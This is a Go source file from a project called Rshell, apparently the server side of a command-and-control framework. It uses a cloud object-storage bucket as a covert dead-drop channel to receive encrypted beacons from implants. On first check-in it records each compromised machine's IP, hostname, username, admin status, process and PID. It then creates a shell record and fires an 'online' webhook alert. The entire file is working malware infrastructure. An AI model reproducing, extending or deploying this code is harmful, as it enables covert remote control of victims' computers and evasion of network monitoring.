package oss

import (
	"Rshell/pkg/connection"
	"Rshell/pkg/connection/base"
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/logger"
	"Rshell/pkg/utils"
	"Rshell/pkg/webhooks"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// OSSConfig OSS配置
type OSSConfig struct {
	Endpoint        string
	AccessKeyID     string
	AccessKeySecret string
	BucketName      string
	PollInterval    time.Duration
	MaxWorkers      int
	RetryCount      int
}

// OSSClient OSS客户端结构
type OSSClient struct {
	Config     *OSSConfig
	IsRunning  atomic.Bool
	StopChan   chan struct{}
	WorkerPool chan struct{}
	Wg         sync.WaitGroup
	LastPoll   time.Time
	Stats      *OSSStats
}

// OSSStats 统计信息
type OSSStats struct {
	TotalMessages     int64
	ProcessedMessages int64
	FailedMessages    int64
	LastError         string
	LastPollTime      time.Time
	mu                sync.RWMutex
}

// ProcessedClient 已处理客户端缓存
type ProcessedClient struct {
	UID         string
	LastSeen    time.Time
	MessageChan chan []byte
	StopChan    chan struct{}
}

var (
	globalOSSManager = make(map[string]*OSSClient)
	ossManagerMu     sync.RWMutex

	// 处理中的客户端
	processedClients = make(map[string]*ProcessedClient)
	processedMu      sync.RWMutex

	// OSS统计
	globalOSSStats = &OSSStats{}
)

// NewOSSClient creates a new OSS client
func NewOSSClient(endpoint, accessKeyID, accessKeySecret, bucketName string, stopchan chan struct{}) *OSSClient {
	return &OSSClient{
		Config: &OSSConfig{
			Endpoint:        endpoint,
			AccessKeyID:     accessKeyID,
			AccessKeySecret: accessKeySecret,
			BucketName:      bucketName,
			PollInterval:    time.Second * 2, // 默认2秒轮询
			MaxWorkers:      10,              // 最大工作协程数
			RetryCount:      3,               // 重试次数
		},
		StopChan:   stopchan,
		WorkerPool: make(chan struct{}, 10),
		Stats:      &OSSStats{},
	}
}

// HandleOSSConnection 处理OSS连接（优化版）
func HandleOSSConnection(endpoint, accessKeyID, accessKeySecret, bucketName string, stopchan chan struct{}) {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("OSS connection handler panic recovered:", r)
		}
	}()

	// 创建客户端
	client := NewOSSClient(endpoint, accessKeyID, accessKeySecret, bucketName, stopchan)

	// 注册到全局管理器
	ossKey := endpoint + ":" + accessKeyID + ":" + bucketName
	ossManagerMu.Lock()
	globalOSSManager[ossKey] = client
	ossManagerMu.Unlock()

	// 初始化OSS客户端
	if err := InitClient(endpoint, accessKeyID, accessKeySecret, bucketName); err != nil {
		logger.Error("Failed to initialize OSS client:", err)
		return
	}

	logger.Info("OSS client started:", ossKey)

	// 设置运行状态
	client.IsRunning.Store(true)

	// 启动监控协程
	client.Wg.Add(1)
	go client.monitor()

	// 主处理循环
	client.processLoop()

	// 等待所有协程结束
	client.Wg.Wait()

	// 清理资源
	ossManagerMu.Lock()
	delete(globalOSSManager, ossKey)
	ossManagerMu.Unlock()

	logger.Info("OSS client stopped:", ossKey)
}

// processLoop 处理循环
func (c *OSSClient) processLoop() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("OSS process loop panic recovered:", r)
		}
	}()

	// 指数退避参数
	backoffFactor := 1
	maxBackoff := 32

	for c.IsRunning.Load() {
		select {
		case <-c.StopChan:
			logger.Info("OSS client received stop signal")
			return
		default:
			startTime := time.Now()

			// 获取消息列表
			messages, err := c.pollMessages()
			if err != nil {
				logger.Error("Failed to poll OSS messages:", err)

				// 指数退避
				backoff := time.Duration(backoffFactor) * c.Config.PollInterval
				if backoffFactor < maxBackoff {
					backoffFactor *= 2
				}

				logger.Info("Backing off for", backoff, "seconds")
				time.Sleep(backoff)
				continue
			}

			// 重置退避因子
			backoffFactor = 1

			// 更新统计
			c.Stats.mu.Lock()
			c.Stats.TotalMessages += int64(len(messages))
			c.Stats.LastPollTime = time.Now()
			c.Stats.mu.Unlock()

			// 处理消息
			if len(messages) > 0 {
				c.processMessages(messages)
			}

			// 控制轮询频率
			elapsed := time.Since(startTime)
			if elapsed < c.Config.PollInterval {
				sleepTime := c.Config.PollInterval - elapsed
				time.Sleep(sleepTime)
			}

			// 清理过期的客户端
			c.cleanupStaleClients()
		}
	}
}

// pollMessages 轮询消息
func (c *OSSClient) pollMessages() ([]string, error) {
	var keys []string

	// 列出所有client相关的key
	objects, err := List(Service)
	if err != nil {
		return nil, err
	}
	for _, obj := range objects {
		if strings.Contains(obj.Key, "client") {
			keys = append(keys, obj.Key)
		}
	}

	// 按时间戳排序
	sort.Slice(keys, func(i, j int) bool {
		return keys[i] < keys[j]
	})

	// 更新最后轮询时间
	c.LastPoll = time.Now()

	return keys, nil
}

// processMessages 处理消息
// processMessages 处理消息（保持顺序）
func (c *OSSClient) processMessages(keys []string) {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("OSS process messages panic recovered:", r)
		}
	}()

	// 按 UID 分组消息
	uidMessages := make(map[string][]string)

	for _, key := range keys {
		if !c.IsRunning.Load() {
			break
		}

		// 从 key 中提取 UID（需要根据你的 key 格式调整）
		// 假设 key 格式为: "client_<timestamp>_<uid>_..."
		parts := strings.Split(key, "_")
		if len(parts) >= 3 {
			uid := parts[2]
			uidMessages[uid] = append(uidMessages[uid], key)
		} else {
			// 如果不能提取 UID，按普通顺序处理
			uidMessages[""] = append(uidMessages[""], key)
		}
	}

	// 为每个 UID 创建一个处理协程
	var wg sync.WaitGroup
	for uid, messages := range uidMessages {
		wg.Add(1)

		go func(uid string, msgKeys []string) {
			defer wg.Done()

			// 对每个 UID 的消息按时间排序
			sort.Strings(msgKeys)

			// 串行处理同一个 UID 的消息
			for _, key := range msgKeys {
				if !c.IsRunning.Load() {
					break
				}

				// 处理单个消息
				for attempt := 0; attempt <= c.Config.RetryCount; attempt++ {
					if err := c.processSingleMessage(key); err == nil {
						c.Stats.mu.Lock()
						c.Stats.ProcessedMessages++
						c.Stats.mu.Unlock()
						break
					} else {
						if attempt == c.Config.RetryCount {
							c.Stats.mu.Lock()
							c.Stats.FailedMessages++
							c.Stats.LastError = err.Error()
							c.Stats.mu.Unlock()
							logger.Error("Failed to process message after retries:", key, "Error:", err)
						} else {
							time.Sleep(time.Duration(attempt+1) * time.Second)
						}
					}
				}
			}
		}(uid, messages)
	}

	wg.Wait()
}

// processSingleMessage 处理单个消息
func (c *OSSClient) processSingleMessage(key string) error {
	// 获取消息内容
	message := Get(Service, key)
	if message == nil {
		return fmt.Errorf("empty message for key: %s", key)
	}

	// 删除已处理的消息
	if err := Del(Service, key); err != nil {
		logger.Error("Failed to delete message:", key, err)
	}

	// 处理消息
	return processMessage(message)
}

// processMessage 处理消息内容
func processMessage(message []byte) error {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("Process message panic recovered:", r)
		}
	}()

	if len(message) < 4 {
		return fmt.Errorf("message too short: %d bytes", len(message))
	}

	msgTypeBytes := message[:4]
	msgType := binary.BigEndian.Uint32(msgTypeBytes)

	switch msgType {
	case 1: // firstBlood
		if len(message) < 5 {
			return fmt.Errorf("firstBlood message too short: %d bytes", len(message))
		}
		return handleFirstBlood(message[4:])
	case 2: // otherMsg
		if len(message) < 8 {
			return fmt.Errorf("otherMsg message too short: %d bytes", len(message))
		}
		return handleOtherMsg(message[4:])
	default:
		return fmt.Errorf("unknown message type: %d", msgType)
	}
}

// handleFirstBlood 处理首次连接
func handleFirstBlood(msg []byte) error {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("Handle firstBlood panic recovered:", r)
		}
	}()

	if len(msg) == 0 {
		return fmt.Errorf("empty firstBlood payload")
	}

	tmpMetainfo, err := encrypt.DecodeBase64(msg)
	if err != nil {
		return fmt.Errorf("decode base64 failed: %w", err)
	}

	metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
	if err != nil {
		return fmt.Errorf("decrypt failed: %w", err)
	}

	// 验证metainfo长度
	if len(metainfo) < 9 {
		return fmt.Errorf("metainfo too short: %d bytes", len(metainfo))
	}

	uid := encrypt.BytesToMD5(metainfo)

	// 验证UID
	if len(uid) == 0 {
		return fmt.Errorf("invalid UID generated")
	}

	// 更新连接类型
	connection.GlobalManager.SetListenerType(uid, "oss")

	// 检查是否已存在
	var existingClient database.Clients
	exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)

	if !exists {
		// 安全解析数据
		if len(metainfo) < 9 {
			return fmt.Errorf("metainfo insufficient for parsing: %d bytes", len(metainfo))
		}
		publicKey := metainfo[:32]
		metainfo = metainfo[32:]
		processID := binary.BigEndian.Uint32(metainfo[:4])
		flag := int(metainfo[4])

		// 验证IP数据
		if len(metainfo) < 9 {
			return fmt.Errorf("metainfo too short for IP: %d bytes", len(metainfo))
		}

		ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
		localIP := utils.Uint32ToIP(ipInt).String()

		// 安全获取osInfo
		var osInfo string
		if len(metainfo) > 9 {
			osInfo = string(metainfo[9:])
		}

		// 使用安全分割函数
		hostName, UserName, processName := base.SafeSplitOSInfo(osInfo)

		externalIp := "oss上线"
		address := "oss上线"

		currentTime := time.Now()
		timeFormat := "01-02 15:04"
		formattedTime := currentTime.Format(timeFormat)

		arch := "x86"

		// 处理flag标志位
		if flag > 8 {
			UserName += "*"
			flag = flag - 8
		}
		if flag > 4 {
			arch = "x64"
		}

		// 验证数据有效性
		if processName == "" {
			processName = "Unknown"
		}
		if hostName == "" {
			hostName = "Unknown"
		}
		if UserName == "" {
			UserName = "Unknown"
		}

		// 使用事务插入
		session := database.Engine.NewSession()
		defer session.Close()

		if err := session.Begin(); err != nil {
			return fmt.Errorf("begin transaction failed: %w", err)
		}

		c := database.Clients{
			Uid:        uid,
			FirstStart: formattedTime,
			ExternalIP: externalIp,
			InternalIP: localIP,
			Username:   UserName,
			Computer:   hostName,
			Process:    processName,
			Pid:        strconv.Itoa(int(processID)),
			Address:    address,
			Arch:       arch,
			Note:       "",
			Sleep:      "5",
			Online:     "1",
			Color:      "",
			PublicKey:  base64.StdEncoding.EncodeToString(publicKey[:]),
		}
		encrypt.PublicKeyMap[uid] = base64.StdEncoding.EncodeToString(publicKey[:])
		if _, err := session.Insert(&c); err != nil {
			session.Rollback()
			return fmt.Errorf("insert client failed: %w", err)
		}

		if _, err := session.Insert(&database.Shell{Uid: uid, ShellContent: ""}); err != nil {
			session.Rollback()
			return fmt.Errorf("insert shell failed: %w", err)
		}

		if _, err := session.Insert(&database.Notes{Uid: uid, Note: ""}); err != nil {
			session.Rollback()
			return fmt.Errorf("insert notes failed: %w", err)
		}

		if err := session.Commit(); err != nil {
			return fmt.Errorf("commit transaction failed: %w", err)
		}

		// 发送Webhook通知
		go webhooks.NotifyOnline(c)

		logger.Info("New OSS client registered:", uid)
	} else {
		// 更新在线状态
		if _, err := database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"}); err != nil {
			logger.Error("Failed to update client status:", err)
		}
		logger.Info("OSS client reconnected:", uid)
	}

	return nil
}

// handleOtherMsg 处理其他消息
func handleOtherMsg(msg []byte) error {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("Handle otherMsg panic recovered:", r)
		}
	}()

	if len(msg) < 4 {
		return fmt.Errorf("otherMsg too short: %d bytes", len(msg))
	}

	metaLen := binary.BigEndian.Uint32(msg[:4])

	// 验证metaLen的合理性
	if metaLen > uint32(len(msg)-4) {
		return fmt.Errorf("invalid meta length: %d, available: %d", metaLen, len(msg)-4)
	}

	if metaLen == 0 {
		return fmt.Errorf("zero meta length")
	}

	if len(msg) < int(4+metaLen) {
		return fmt.Errorf("message too short for meta: %d bytes", len(msg))
	}

	metaMsg := msg[4 : 4+metaLen]
	realMsg := msg[4+metaLen:]

	// 验证realMsg不为空
	if len(realMsg) == 0 {
		return fmt.Errorf("empty real message")
	}

	tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
	if err != nil {
		return fmt.Errorf("decode base64 failed: %w", err)
	}

	metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
	if err != nil {
		return fmt.Errorf("decrypt failed: %w", err)
	}

	uid := encrypt.BytesToMD5(metainfo)

	// 验证UID
	if len(uid) == 0 {
		return fmt.Errorf("invalid UID generated")
	}

	dataBytes, err := encrypt.DecodeBase64(realMsg)
	if err != nil {
		return fmt.Errorf("decode base64 failed: %w", err)
	}

	dataBytes, err = encrypt.Decrypt(dataBytes, uid)
	if err != nil {
		return fmt.Errorf("first decrypt failed: %w", err)
	}

	dataBytes, err = encrypt.Decrypt(dataBytes, uid)
	if err != nil {
		return fmt.Errorf("second decrypt failed: %w", err)
	}

	// 严格检查dataBytes长度
	if len(dataBytes) < 4 {
		return fmt.Errorf("decrypted data too short: %d bytes", len(dataBytes))
	}

	replyTypeBytes := dataBytes[:4]
	data := dataBytes[4:]
	replyType := binary.BigEndian.Uint32(replyTypeBytes)

	handler := base.ReplyHandler{UID: uid}
	handler.Handle(replyType, data)

	return nil
}

// monitor 监控协程
func (c *OSSClient) monitor() {
	defer c.Wg.Done()

	defer func() {
		if r := recover(); r != nil {
			logger.Error("OSS monitor panic recovered:", r)
		}
	}()

	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			c.Stats.mu.RLock()
			logger.Info("OSS Stats:",
				"TotalMessages:", c.Stats.TotalMessages,
				"ProcessedMessages:", c.Stats.ProcessedMessages,
				"FailedMessages:", c.Stats.FailedMessages,
				"LastPoll:", c.Stats.LastPollTime.Format("15:04:05"),
			)
			c.Stats.mu.RUnlock()

		case <-c.StopChan:
			return
		}
	}
}

// cleanupStaleClients 清理过期的客户端
func (c *OSSClient) cleanupStaleClients() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("Cleanup stale clients panic recovered:", r)
		}
	}()

	processedMu.Lock()
	defer processedMu.Unlock()

	now := time.Now()
	for uid, client := range processedClients {
		if now.Sub(client.LastSeen) > 10*time.Minute {
			close(client.StopChan)
			delete(processedClients, uid)
			logger.Info("Cleaned up stale OSS client:", uid)
		}
	}
}

// StopOSSClient 停止OSS客户端
func StopOSSClient(endpoint, accessKeyID, bucketName string) {
	ossKey := endpoint + ":" + accessKeyID + ":" + bucketName

	ossManagerMu.RLock()
	client, exists := globalOSSManager[ossKey]
	ossManagerMu.RUnlock()

	if exists {
		logger.Info("Stopping OSS client:", ossKey)
		client.IsRunning.Store(false)
		close(client.StopChan)
		client.Wg.Wait()
	}
}

// CleanupAllOSS 清理所有OSS客户端
func CleanupAllOSS() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("Cleanup all OSS panic recovered:", r)
		}
	}()

	ossManagerMu.Lock()
	defer ossManagerMu.Unlock()

	for key, client := range globalOSSManager {
		logger.Info("Stopping OSS client:", key)
		client.IsRunning.Store(false)
		close(client.StopChan)
	}

	// 等待所有客户端停止
	for _, client := range globalOSSManager {
		client.Wg.Wait()
	}

	// 清空管理器
	globalOSSManager = make(map[string]*OSSClient)
}

// GetOSSStats 获取OSS统计信息
func GetOSSStats() map[string]interface{} {
	stats := make(map[string]interface{})

	ossManagerMu.RLock()
	stats["total_oss_clients"] = len(globalOSSManager)
	ossManagerMu.RUnlock()

	processedMu.RLock()
	stats["processed_clients"] = len(processedClients)
	processedMu.RUnlock()

	return stats
}
